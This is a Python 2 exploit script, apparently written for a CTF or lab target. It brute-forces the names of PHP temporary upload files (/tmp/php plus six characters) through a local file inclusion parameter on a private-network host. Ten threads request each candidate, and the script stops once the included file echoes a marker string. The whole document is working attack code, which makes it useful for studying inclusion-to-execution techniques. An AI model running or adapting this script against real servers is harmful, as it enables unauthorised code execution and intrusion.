#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-07-26 21:31:53
# @Author  : Mote


import requests
import time
import string
import threading
import Queue
import os

requests.adapters.DEFAULT_RETRIES = 5

charset = string.digits + string.letters
url= 'http://192.168.0.107:9999/include.php?a=/tmp/php'
header = {'Connection':'close'}
exitflag = False
s = requests.session()


def get_ready():

	queue=Queue.Queue()
	for i in '8':
		for j in charset:
			for k in charset:
				for l in charset:
					for m in charset:
						for n in charset:
							filesuffix = i+j+k+l+m+n
							urlpath = url+filesuffix
							queue.put(urlpath)
	workers=[]
	
	for t in range(10):
		worker = threading.Thread(target=get,args=(queue,))
		worker.start()
		workers.append(worker)
	for worker in workers:
		worker.join()



def get(queue,):
	try:

		while queue.qsize()!=0:
			urlpath = queue.get(block=False)
			check_if_include(urlpath)
			
	except Exception as e:
		print e


def check_if_include(urlpath):
	try:
		response = s.get(urlpath,headers=header,timeout=2)
		if 'test' in response.text:
			print "[+] Include success! urlpath is "+urlpath
			exitflag = True
			os._exit(0)
	except requests.exceptions.ConnectionError:
		print('Connection Error')
		time.sleep(5)

def main(): 
	get_ready() 


if __name__ == "__main__": 
	main()